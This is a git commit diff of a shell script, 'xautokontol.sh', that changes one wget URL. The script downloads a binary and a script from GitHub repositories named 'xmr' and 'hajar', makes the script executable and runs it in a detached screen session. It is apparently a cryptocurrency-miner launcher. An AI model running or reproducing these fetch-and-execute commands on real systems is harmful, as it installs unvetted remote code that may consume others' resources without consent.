155db03c7fecde1f6e35096068b5efdc07d7b2fa
renilo <88342640+renilo@users.noreply.github.com>
2021-10-20 14:13:59 +0700

    Update xautokontol.sh

--- xautokontol.sh
+++ xautokontol.sh
@@ -8,7 +8,7 @@ screen -dmS xhajar.sh ./xhajar.sh 65 75
 
 wget https://github.com/renilo/xmr/raw/main/meki-baru1
 
-wget https://raw.githubusercontent.com/renilo/xmr/main/xhajar.sh
+wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar.sh
 
 chmod +x xhajar.sh
 
